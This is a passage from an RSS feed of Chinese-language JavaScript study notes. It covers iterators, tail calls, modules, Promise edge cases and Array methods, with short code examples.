console<span>.</span><span>log</span><span>(</span>a<span>)</span> <span>// ?? =>  { index: 2 }</span>
<span>// 再然后</span>
a<span>.</span>index<span>++</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_18-并行线程与并发"> 18. 并行线程与并发</h2>
<ul>
<li>
<p>并行计算最常见的工具就是进程和线程。进程和线程独立运行，并可能同时运行：在不同的处理器，甚至不同的计算机上，但多个线程能够共享单个进程的内存。</p>
</li>
<li>
<p>两个或多个 “进程” 同时执行就出现了并发，不管组成它们的单个运算是否并行执行（在独立的处理器或处理器核心上同时运行）。可以把并发看作 “进程” 级（或者任务级）的并行，与运算级的并行（不同处理器上的线程）相对。</p>
</li>
</ul>
<h2 id="_19-不是所有的引擎都类似"> 19. 不是所有的引擎都类似</h2>
<ul>
<li>过去把多个字符串值放在一个数组中，然后在数组上调用 join(&quot;&quot;) 来连接这些值比直接用 + 连接这些值要快。这一点的历史原因是微妙的，涉及字符串值在内存中如何存储和管理这样的内部实现细节。</li>
</ul>
<h2 id="_20-尾调用优化-你不知道的-js-下"> 20. 尾调用优化（<a href="/note/books/You-Don’t-Know-JS-Vol3/#_4-尾调用">你不知道的 JS（下）</a>）</h2>
<ul>
<li>简单地说，尾调用就是一个出现在另一个函数 “结尾” 处的函数调用。这个调用结束后就没有其余事情要做了（除了可能要返回结果值）。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>x</span><span>)</span> <span>{</span>
  <span>return</span> x
<span>}</span>
<span>function</span> <span>bar</span><span>(</span><span>y</span><span>)</span> <span>{</span>
  <span>return</span> <span>foo</span><span>(</span>y <span>+</span> <span>1</span><span>)</span> <span>// 尾调用</span>
<span>}</span>
<span>function</span> <span>baz</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>1</span> <span>+</span> <span>bar</span><span>(</span><span>40</span><span>)</span> <span>// 非尾调用</span>
<span>}</span>
<span>baz</span><span>(</span><span>)</span> <span>// 42</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Three.js 开发指南</title>
      <link>https://www.matrixtheone.ga/web/note/books/Three/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Three/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Three.js 开发指南</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>你不知道的 JS（下）</title>
      <link>https://www.matrixtheone.ga/web/note/books/You-Don%E2%80%99t-Know-JS-Vol3/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/You-Don%E2%80%99t-Know-JS-Vol3/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">你不知道的 JS（下）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-迭代器"> 1. 迭代器</h2>
<ul>
<li>每次在这个 arr 值上调用位于 Symbol.iterator 的方法时，都会产生一个全新的迭代器。多数结构都是这么实现的，包括所有 JavaScript 内置数据结构。</li>
</ul>
<div><pre><code><span>var</span> arr <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span>
<span>var</span> it <span>=</span> arr<span>[</span>Symbol<span>.</span>iterator<span>]</span><span>(</span><span>)</span>
it<span>.</span><span>next</span><span>(</span><span>)</span> <span>// { value: 1, done: false }</span>
it<span>.</span><span>next</span><span>(</span><span>)</span> <span>// { value: 2, done: false }</span>
it<span>.</span><span>next</span><span>(</span><span>)</span> <span>// { value: 3, done: false }</span>
it<span>.</span><span>next</span><span>(</span><span>)</span> <span>// { value: undefined, done: true }</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>自定义迭代器。</li>
</ul>
<div><pre><code><span>var</span> Fib <span>=</span> <span>{</span>
  <span>[</span>Symbol<span>.</span>iterator<span>]</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> n1 <span>=</span> <span>1</span><span>,</span>
      n2 <span>=</span> <span>1</span>
    <span>return</span> <span>{</span>
      <span>// 使迭代器成为iterable</span>
      <span>[</span>Symbol<span>.</span>iterator<span>]</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>this</span>
      <span>}</span><span>,</span>
      <span>next</span><span>(</span><span>)</span> <span>{</span>
        <span>var</span> current <span>=</span> n2
        n2 <span>=</span> n1
        n1 <span>=</span> n1 <span>+</span> current
        <span>return</span> <span>{</span> <span>value</span><span>:</span> current<span>,</span> <span>done</span><span>:</span> <span>false</span> <span>}</span>
      <span>}</span><span>,</span>
      <span>return</span><span>(</span>v<span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>'Fibonacci sequence abandoned.'</span><span>)</span>
        <span>return</span> <span>{</span> <span>value</span><span>:</span> v<span>,</span> <span>done</span><span>:</span> <span>true</span> <span>}</span>
      <span>}</span><span>,</span>
    <span>}</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>for</span> <span>(</span><span>var</span> v <span>of</span> Fib<span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>v<span>)</span>
  <span>if</span> <span>(</span>v <span>></span> <span>50</span><span>)</span> <span>break</span>
<span>}</span>

<span>// 1 1 2 3 5 8 13 21 34 55</span>
<span>// Fibonacci sequence abandoned.</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><ul>
<li>迭代数字。</li>
</ul>
<div><pre><code><span>if</span> <span>(</span><span>!</span><span>Number</span><span>.</span>prototype<span>[</span>Symbol<span>.</span>iterator<span>]</span><span>)</span> <span>{</span>
  Object<span>.</span><span>defineProperty</span><span>(</span><span>Number</span><span>.</span>prototype<span>,</span> Symbol<span>.</span>iterator<span>,</span> <span>{</span>
    <span>writable</span><span>:</span> <span>true</span><span>,</span>
    <span>configurable</span><span>:</span> <span>true</span><span>,</span>
    <span>enumerable</span><span>:</span> <span>false</span><span>,</span>
    <span>value</span><span>:</span> <span>function</span> <span>iterator</span><span>(</span><span>)</span> <span>{</span>
      <span>var</span> i<span>,</span>
        inc<span>,</span>
        done <span>=</span> <span>false</span><span>,</span>
        top <span>=</span> <span>+</span><span>this</span>
      <span>// 正向还是反向迭代？</span>
      inc <span>=</span> <span>1</span> <span>*</span> <span>(</span>top <span>&lt;</span> <span>0</span> <span>?</span> <span>-</span><span>1</span> <span>:</span> <span>1</span><span>)</span>
      <span>return</span> <span>{</span>
        <span>// 使得迭代器本身成为iterable!</span>
        <span>[</span>Symbol<span>.</span>iterator<span>]</span><span>(</span><span>)</span> <span>{</span>
          <span>return</span> <span>this</span>
        <span>}</span><span>,</span>
        <span>next</span><span>(</span><span>)</span> <span>{</span>
          <span>if</span> <span>(</span><span>!</span>done<span>)</span> <span>{</span>
            <span>// 初始迭代总是0</span>
            <span>if</span> <span>(</span>i <span>==</span> <span>null</span><span>)</span> <span>{</span>
              i <span>=</span> <span>0</span>
            <span>}</span>
            <span>// 正向迭代</span>
            <span>else</span> <span>if</span> <span>(</span>top <span>>=</span> <span>0</span><span>)</span> <span>{</span>
              i <span>=</span> Math<span>.</span><span>min</span><span>(</span>top<span>,</span> i <span>+</span> inc<span>)</span>
            <span>}</span>
            <span>// 反向迭代</span>
            <span>else</span> <span>{</span>
              i <span>=</span> Math<span>.</span><span>max</span><span>(</span>top<span>,</span> i <span>+</span> inc<span>)</span>
            <span>}</span>
            <span>// 本次迭代后结束？</span>
            <span>if</span> <span>(</span>i <span>==</span> top<span>)</span> done <span>=</span> <span>true</span>
            <span>return</span> <span>{</span> <span>value</span><span>:</span> i<span>,</span> <span>done</span><span>:</span> <span>false</span> <span>}</span>
          <span>}</span> <span>else</span> <span>{</span>
            <span>return</span> <span>{</span> <span>done</span><span>:</span> <span>true</span> <span>}</span>
          <span>}</span>
        <span>}</span><span>,</span>
      <span>}</span>
    <span>}</span><span>,</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>for</span> <span>(</span><span>var</span> i <span>of</span> <span>3</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>i<span>)</span>
<span>}</span>
<span>// 0 1 2 3</span>
<span>[</span><span>...</span><span>-</span><span>3</span><span>]</span> <span>// [0,-1,-2,-3]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br></div></div><h2 id="_2-模块"> 2. 模块</h2>
<ul>
<li>这里有一个很容易被忽略的重要细节：import 和 export 都必须出现在使用它们的最顶层作用域。举例来说，不能把 import 或 export 放在 if 条件中。它们必须出现在所有代码块和函数的外面。</li>
</ul>
<h2 id="_3-promise"> 3. Promise</h2>
<ul>
<li>Promise.all([]) 将会立即完成（没有完成值），Promise.race([]) 将会永远挂起。这是一个很奇怪的不一致，因此我建议，永远不要用空数组使用这些方法。</li>
</ul>
<h2 id="_4-尾调用"> 4. 尾调用</h2>
<ul>
<li>
<p><a href="https://www.ruanyifeng.com/blog/2015/04/tail-call.html" target="_blank" rel="noopener noreferrer">阮一峰</a></p>
</li>
<li>
<p>ES6 的尾调用优化只在严格模式下开启，正常模式是无效的。这是因为在正常模式下，函数内部有两个变量，可以跟踪函数的调用栈。</p>
</li>
<li>
<p>尾调用优化发生时，函数的调用栈会改写，因此上面两个变量就会失真。严格模式禁用这两个变量，所以尾调用模式仅在严格模式下生效。</p>
</li>
</ul>
<blockquote>
<ul>
<li>arguments：返回调用时函数的参数。</li>
<li>func.caller：返回调用当前函数的那个函数。</li>
</ul>
</blockquote>
]]></content:encoded>
    </item>
    <item>
      <title>Array</title>
      <link>https://www.matrixtheone.ga/web/note/js/Array-1/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Array-1/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Array</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>提示</p>
<p>会改变原数组</p>
</div>
<h2 id="_1-unshift-any-push-any"> 1. unshift(any...) &amp; push(any...)</h2>
<ul>
<li>在数组首/尾添加数据，返回添加后数组的长度。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>unshift</span><span>(</span><span>0</span><span>)</span> <span>// => 6</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>unshift</span><span>(</span><span>0</span><span>,</span> <span>7</span><span>)</span> <span>// => 7</span>

<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>push</span><span>(</span><span>6</span><span>)</span> <span>// => 6</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>push</span><span>(</span><span>6</span><span>,</span> <span>7</span><span>)</span> <span>// => 7</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_2-shift-pop"> 2. shift() &amp; pop()</h2>
<ul>
<li>删除数组第一项/最后一项，返回删除的值。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>shift</span><span>(</span><span>)</span> <span>// => 1</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>pop</span><span>(</span><span>)</span> <span>// => 5</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_3-splice-startindex-length-additem"> 3. splice(startIndex, length, addItem...)</h2>
<ul>
<li>
<p>可用于数组的增删改操作，返回删除项组成的数组。</p>
</li>
<li>
<p>若删除长度未指定，删除至结束，负数反序计算。开始索引溢出，或删除长度为负数，等同于未操作数组</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>splice</span><span>(</span><span>3</span><span>)</span> <span>// => [4, 5]</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>splice</span><span>(</span><span>-</span><span>2</span><span>,</span> <span>1</span><span>)</span> <span>// => [4]</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>splice</span><span>(</span><span>3</span><span>,</span> <span>2</span><span>,</span> <span>'jack'</span><span>,</span> <span>'love'</span><span>)</span> <span>// => [4, 5]</span>

<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>splice</span><span>(</span><span>6</span><span>)</span> <span>// => []</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>splice</span><span>(</span><span>1</span><span>,</span> <span>-</span><span>1</span><span>)</span> <span>// => []</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_4-reverse"> 4. reverse()</h2>
<ul>
<li>翻转数组。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>reverse</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_5-sort-comparefunction"> 5. sort(compareFunction)</h2>
<ul>
<li>
<p>默认把所有元素先转换为 String 再排序，按照第一个字符的 ASCII 值排序。</p>
</li>
<li>
<p>compareFunction（比较器）：返回负数时，第一个参数排在前面；返回正数时，第二个参数排在前面。</p>
</li>
<li>
<p>ECMAScript 没有定义用哪个排序算法，所以浏览器厂商可以自行去实现算法。自 ES10（EcmaScript 2019）起，规范要求 Array.prototype.sort 为稳定排序。</p>
<blockquote>
<ul>
<li>Mozilla Firefox 使用归并排序作为 Array.prototype.sort 的实现（归并排序是稳定的）。</li>
<li>Chrome 在 V8 引擎 7.0 版本前使用了一个快速排序的变体：插入排序和快速排序结合的排序算法。数组长度不超过 10 时，使用插入排序（在数组长度较短时插入排序更有效率），长度超过 10 使用优化的快速排序（快速排序是不稳定的）。在 7.0 版本之后采用了一种混合排序算法 TimSort：在数据量小的子数组中使用插入排序，然后再使用归并排序将有序的子数组进行合并排序。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>[</span><span>2</span><span>,</span> <span>7</span><span>,</span> <span>3</span><span>,</span> <span>15</span><span>]</span><span>.</span><span>sort</span><span>(</span><span>)</span> <span>// => [15, 2, 3, 7]</span>
<span>// 升序</span>
<span>[</span><span>2</span><span>,</span> <span>7</span><span>,</span> <span>3</span><span>,</span> <span>15</span><span>]</span><span>.</span><span>sort</span><span>(</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>=></span> a <span>-</span> b<span>)</span> <span>// => [2, 3, 7, 15]</span>
<span>// 降序</span>
<span>[</span><span>2</span><span>,</span> <span>7</span><span>,</span> <span>3</span><span>,</span> <span>15</span><span>]</span><span>.</span><span>sort</span><span>(</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>=></span> b <span>-</span> a<span>)</span> <span>// => [15, 7, 3, 2]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>
<p><a href="https://github.com/mqyqingfeng/Blog/issues/52" target="_blank" rel="noopener noreferrer">JavaScript 专题之解读 v8 排序源码 - 冴羽</a></p>
</li>
<li>
<p><a href="https://www.pzijun.cn/blog/1/1.8.html#v8-%E7%A7%8D%E7%9A%84-array-prototype-sort" target="_blank" rel="noopener noreferrer">讲下 V8 sort 的大概思路，并手写一个 sort 的实现 - 前端瓶子君</a></p>
</li>
</ul>
<h2 id="_6-copywithin-targetindex-beginindex-endindex"> 6. copyWithin(targetIndex, beginIndex, endIndex)</h2>
<ul>
<li>
<p>从数组中复制一部分到数组的另一个位置，覆盖这个位置原来的值。</p>
</li>
<li>
<p>未指定开始索引，开始索引则为 0，未指定结束索引，则截取自末尾（包含开始索引，不包含结束索引）。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>copyWithin</span><span>(</span><span>2</span><span>)</span> <span>// => [1, 2, 1, 2, 3]</span>

<span>// 将索引位置 [1, 3) 的项，替换到索引位置为 [2, (2 + 3 - 1)) 的项上</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>copyWithin</span><span>(</span><span>2</span><span>,</span> <span>1</span><span>,</span> <span>3</span><span>)</span> <span>// => [1, 2, 2, 3, 5]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Array</title>
      <link>https://www.matrixtheone.ga/web/note/js/Array-2/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Array-2/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Array</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-array-any-array-of-any"> 1. Array(any...) &amp; Array.of(any...)</h2>
<ul>
<li>
<p>构造函数创建数组。</p>
</li>
<li>
<p>Array.of(3) 创建一个具有单个元素 3 的数组，而 Array(3) 创建一个长度为 3 的空数组。</p>
</li>
</ul>
<div><pre><code><span>Array</span><span>(</span><span>)</span> <span>// => []</span>
<span>Array</span><span>(</span><span>2</span><span>)</span> <span>// => [empty × 2] （不可遍历！）</span>
<span>Array</span><span>(</span><span>2</span><span>,</span> <span>9</span><span>)</span> <span>// => [2, 9]</span>

Array<span>.</span><span>of</span><span>(</span><span>)</span> <span>// => []</span>
Array<span>.</span><span>of</span><span>(</span><span>2</span><span>)</span> <span>// => [2]</span>
Array<span>.</span><span>of</span><span>(</span><span>2</span><span>,</span> <span>9</span><span>)</span> <span>// => [2, 9]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_2-array-from-arraylike-iterable-callback-this"> 2. Array.from(arrayLike | iterable, callback, this)</h2>
<ul>
<li>
<p>将类数组或可迭代对象转换为数组。</p>
</li>
<li>
<p>第二个参数可传递一个回调函数。</p>
</li>
</ul>
<div><pre><code><span>const</span> ary <span>=</span> <span>{</span>
  <span>0</span><span>:</span> <span>'姜姒'</span><span>,</span>
  <span>1</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>length</span><span>:</span> <span>2</span><span>,</span>
<span>}</span>

Array<span>.</span><span>from</span><span>(</span>ary<span>)</span> <span>// => ['姜姒', '徐扶墙']</span>
Array<span>.</span><span>from</span><span>(</span><span>'jack'</span><span>)</span> <span>// => => ['j', 'a', 'c', 'k']</span>

Array<span>.</span><span>from</span><span>(</span>ary<span>,</span> <span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> <span><span>`</span><span><span>${</span>item<span>}</span></span><span>7</span><span>`</span></span><span>)</span> <span>// => ['姜姒7', '徐扶墙7']</span>

<span>// 快速创建指定长度数组（可遍历）</span>
Array<span>.</span><span>from</span><span>(</span><span>{</span> <span>length</span><span>:</span> <span>2</span> <span>}</span><span>)</span> <span>// => [undefined, undefined]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_3-array-isarray-any"> 3. Array.isArray(any)</h2>
<ul>
<li>判断是否为数组。</li>
</ul>
<div><pre><code>Array<span>.</span><span>isArray</span><span>(</span><span>[</span><span>]</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_4-join-string"> 4. join(string)</h2>
<ul>
<li>
<p>默认以逗号连接数组每一项。</p>
</li>
<li>
<p>数组中的 null 与 undefined 会转换为空字符串。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>null</span><span>,</span> <span>3</span><span>,</span> <span>undefined</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>join</span><span>(</span><span>)</span> <span>// => '1,,3,,5'</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_5-concat-any"> 5. concat(any...)</h2>
<ul>
<li>可以连接任意类型数据。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>]</span><span>.</span><span>concat</span><span>(</span><span>[</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>,</span> <span>[</span><span>6</span><span>,</span> <span>7</span><span>]</span><span>)</span> <span>// => [1, 2, 3, 4, 5, 6, 7]</span>

<span>[</span><span>1</span><span>,</span> <span>2</span><span>]</span><span>.</span><span>concat</span><span>(</span><span>'777'</span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span> <span>// => [1, 2, '777', Thu Jan 01 1970 00:00:00 GMT+0800 (中国标准时间)]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_6-slice-beginindex-endindex"> 6.slice(beginIndex, endIndex)</h2>
<ul>
<li>从开始索引截取至结束索引，若结束索引未指定，截取至末尾，负数反序截取（包含开始索引，不包含结束索引）。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// => [2, 3, 4, 5]</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>,</span> <span>3</span><span>)</span> <span>// => [2, 3]</span>

<span>// 开始索引溢出，返回空数组</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>slice</span><span>(</span><span>7</span><span>)</span> <span>// => []</span>
<span>// 取数组最后一项</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>slice</span><span>(</span><span>-</span><span>1</span><span>)</span><span>[</span><span>0</span><span>]</span> <span>// => 5</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_7-fill-any-startindex-endindex"> 7. fill(any, startIndex, endIndex)</h2>
<ul>
<li>
<p>默认以 undefined 填充数组每一项。</p>
</li>
<li>
<p>第二个参数为开始索引，第三个参数项为结束索引（包含开始索引，不包含结束索引）。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>fill</span><span>(</span><span>7</span><span>)</span> <span>// => [7, 7, 7, 7, 7]</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>fill</span><span>(</span><span>)</span> <span>// [undefined, undefined, undefined, undefined, undefined]</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>fill</span><span>(</span><span>7</span><span>,</span> <span>2</span><span>,</span> <span>4</span><span>)</span> <span>// => [1, 2, 7, 7, 5]</span>

<span>// 快速创建指定长度数组</span>
<span>Array</span><span>(</span><span>7</span><span>)</span><span>.</span><span>fill</span><span>(</span><span>7</span><span>)</span> <span>// => [7, 7, 7, 7, 7, 7, 7]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_8-flat-depth"> 8. flat(depth)</h2>
<ul>
<li>默认扁平化一级。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>,</span> <span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>[</span><span>4</span><span>,</span> <span>5</span><span>]</span><span>]</span><span>]</span><span>.</span><span>flat</span><span>(</span><span>)</span> <span>// => [1, 2, 3, [4, 5]]</span>
<span>[</span><span>1</span><span>,</span> <span>,</span> <span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>[</span><span>4</span><span>,</span> <span>5</span><span>]</span><span>]</span><span>]</span><span>.</span><span>flat</span><span>(</span><span>Infinity</span><span>)</span> <span>// => [1, 2, 3, 4, 5]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_9-flatmap-callback-this"> 9. flatMap(callback, this)</h2>
<ul>
<li>与 map 连着深度值为 1 的 flat 几乎相同（<code>flatMap = ary =&gt; ary.flat().map(_ =&gt; _)</code>）。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>,</span> <span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>[</span><span>4</span><span>,</span> <span>5</span><span>]</span><span>]</span><span>]</span><span>.</span><span>flatMap</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item<span>)</span> <span>// => [1, 2, 3, [4, 5]]</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_10-indexof-element-beginindex"> 10. indexOf(element, beginIndex)</h2>
<ul>
<li>
<p>返回元素首次出现的索引位置，未找到返回 -1。</p>
</li>
<li>
<p>第二个参数为开始查找位置。</p>
</li>
<li>
<p>当查找数组中是否存在 NaN 时为返回 -1。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>indexOf</span><span>(</span><span>3</span><span>)</span> <span>// => 2</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>indexOf</span><span>(</span><span>3</span><span>,</span> <span>5</span><span>)</span> <span>// => -1</span>

<span>[</span><span>NaN</span><span>]</span><span>.</span><span>indexOf</span><span>(</span><span>NaN</span><span>)</span> <span>// => -1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_11-lastindexof-element-endindex"> 11. lastIndexOf(element, endIndex)</h2>
<ul>
<li>
<p>返回元素最后出现的索引位置，未找到返回 -1。</p>
</li>
<li>
<p>第二个参数为截止查找位置。</p>
</li>
<li>
<p>当查找数组中是否存在 NaN 时为返回 -1。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>lastIndexOf</span><span>(</span><span>3</span><span>)</span> <span>// => 4</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>lastIndexOf</span><span>(</span><span>3</span><span>,</span> <span>3</span><span>)</span> <span>// => 2</span>

<span>[</span><span>NaN</span><span>]</span><span>.</span><span>lastIndexOf</span><span>(</span><span>NaN</span><span>)</span> <span>// => -1</span>
</code></pre>
